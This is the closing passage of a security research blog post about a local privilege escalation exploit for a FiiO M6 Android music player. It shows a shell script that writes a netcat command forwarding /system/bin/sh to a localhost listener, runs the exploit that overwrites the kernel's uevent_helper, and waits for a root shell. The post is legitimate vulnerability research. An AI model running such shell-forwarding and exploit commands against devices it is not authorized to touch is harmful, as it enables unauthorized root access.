</pre><td class="rouge-code"><pre><span class="o">!</span>/system/bin/sh
<span class="nb">echo</span> <span class="s2">"[+] Creating malicious script at /data/local/tmp/cmd..."</span>  
<span class="nb">echo</span> <span class="s2">"#!/system/bin/sh"</span> <span class="o">&gt;&gt;</span> /data/local/tmp/cmd  
<span class="nb">echo</span> <span class="s2">"/system/bin/busybox1.11 nc 127.0.0.1 4444 -e /system/bin/sh"</span> <span class="o">&gt;&gt;</span> /data/local/tmp/cmd  
<span class="nb">chmod </span>777 cmd

<span class="nb">echo</span> <span class="s2">"[+] Starting exploit..."</span>  
/data/local/tmp/poc 2&gt;/dev/null  
<span class="nb">sleep </span>5

<span class="nb">echo</span> <span class="s2">"[+] Launching listener..."</span>  
<span class="nb">echo</span> <span class="s2">"[!] Wait for r00t shell..."</span>  
/system/bin/busybox1.11 nc <span class="nt">-lp</span> 4444
</pre></table></code></div></div><p>This script will create a new bash file at <code class="language-plaintext highlighter-rouge">/data/local/tmp</code> named <code class="language-plaintext highlighter-rouge">cmd</code>, which lines up with our shellcode. <code class="language-plaintext highlighter-rouge">cmd</code>’s only function is to forward a shell to a localhost listener on port 4444.</p><p>The script then runs our exploit code, which will overwrite the <code class="language-plaintext highlighter-rouge">uevent_helper</code> variable to point at our <code class="language-plaintext highlighter-rouge">cmd</code> file. Finally, we launch a listener on port 4444 waiting for the kernel to execute the <code class="language-plaintext highlighter-rouge">cmd</code> file, giving us a root shell.</p><p><img data-src="/assets/img/img_fiio_exploit/whoami_root.png" alt="whoami_root" data-proofer-ignore></p><p>The full exploit code can be found on my <a href="https://github.com/stigward/PoCs-and-Exploits/tree/main/fiio_LPE_0day">GitHub</a>.</p><h1 id="next-steps">Next Steps:</h1><p>While this project is pretty much over, the last thing I would love to do is pack the exploit into an APK and give users the ability to root their device.</p><p>I also have some other Android based devices laying around the house, such as the HiSense Touch and the Onyx Pocket 2. This project has been a ton of fun, so maybe I will pick one of those to target in the future.</p><p>If you enjoyed this post and want to stay up to date on my future research projects, feel free to give me a follow on <a href="https://twitter.com/_stigward">Twitter</a>.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/exploit-dev/'>Exploit Dev</a>, <a href='/categories/android/'>Android</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/android/" class="post-tag no-text-decoration" >android</a> <a href="/tags/kernel/" class="post-tag no-text-decoration" >kernel</a> <a href="/tags/research/" class="post-tag no-text-decoration" >research</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Rooting+the+FiiO+M6+-+Part+2+-+Writing+an+LPE+Exploit+For+Our+Overflow+Bug+-+Stigward%27s+Security+Journal&url=https%3A%2F%2Fstigward.github.io%2Fposts%2Ffiio-m6-exploit%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Rooting+the+FiiO+M6+-+Part+2+-+Writing+an+LPE+Exploit+For+Our+Overflow+Bug+-+Stigward%27s+Security+Journal&u=https%3A%2F%2Fstigward.github.io%2Fposts%2Ffiio-m6-exploit%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fstigward.github.io%2Fposts%2Ffiio-m6-exploit%2F&text=Rooting+the+FiiO+M6+-+Part+2+-+Writing+an+LPE+Exploit+For+Our+Overflow+Bug+-+Stigward%27s+Security+Journal" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/fiio-m6-exploit/">Rooting the FiiO M6 - Part 2 - Writing an LPE Exploit For Our Overflow Bug</a><li><a href="/posts/fiio-m6-kernel-bug/">Rooting the FiiO M6 - Part 1 - Using the "World's Worst Fuzzer" To Find A Kernel Bug</a><li><a href="/posts/swordmaster-pwn-chal/">UAF and House Of Force Fun - ROMHack CTF Swordmaster Pwn Challenge</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/research/">research</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/kernel/">kernel</a> <a class="post-tag" href="/tags/firmware/">firmware</a> <a class="post-tag" href="/tags/heap/">heap</a> <a class="post-tag" href="/tags/iot/">iot</a> <a class="post-tag" href="/tags/jwt/">jwt</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/ssti/">ssti</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/fiio-m6-kernel-bug/"><div class="card-body"> <em class="small" data-ts="1676777580" data-df="ll" > Feb 18, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Rooting the FiiO M6 - Part 1 - Using the "World's Worst Fuzzer" To Find A Kernel Bug</h3><div class="text-muted small"><p> Overview: A few months ago, I was cleaning off my hardware workbench when I came across my FiiO M6, an Android-based “portable high-resolution lossless music player”. I originally purchased the dev...</p></div></div></a></div><div class="card"> <a href="/posts/wavlink-command-injection/"><div class="card-body"> <em class="small" data-ts="1649215980" data-df="ll" > Apr 5, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Wavlink Command Injection - CVE-2022-23900</h3><div class="text-muted small"><p> Wavlink Command Injection (CVE-2022–23900) TL/DR: The Wavlink WL-WN531P3 router exposes an API endpoint susceptible to command injection. This API endpoint is reachable without an authenticatio...</p></div></div></a></div><div class="card"> <a href="/posts/swordmaster-pwn-chal/"><div class="card-body"> <em class="small" data-ts="1664163180" data-df="ll" > Sep 25, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>UAF and House Of Force Fun - ROMHack CTF Swordmaster Pwn Challenge</h3><div class="text-muted small"><p> Swordmaster Pwn Challenge Overview: This challenge was part of the ROMHack CTF hosted on HackTheBox’s CTF platform. At the end of the 48 hour event, the challenge had roughly 10 solves. I was sadl...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/fiio-m6-kernel-bug/" class="btn btn-outline-primary" prompt="Older"><p>Rooting the FiiO M6 - Part 1 - Using the "World's Worst Fuzzer" To Find A Kernel Bug</p></a><div class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></div></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://twitter.com/_stigward">Stigward</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/research/">research</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/kernel/">kernel</a> <a class="post-tag" href="/tags/firmware/">firmware</a> <a class="post-tag" href="/tags/heap/">heap</a> <a class="post-tag" href="/tags/iot/">iot</a> <a class="post-tag" href="/tags/jwt/">jwt</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/ssti/">ssti</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-QK87P1LVPH"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-QK87P1LVPH'); }); </script>
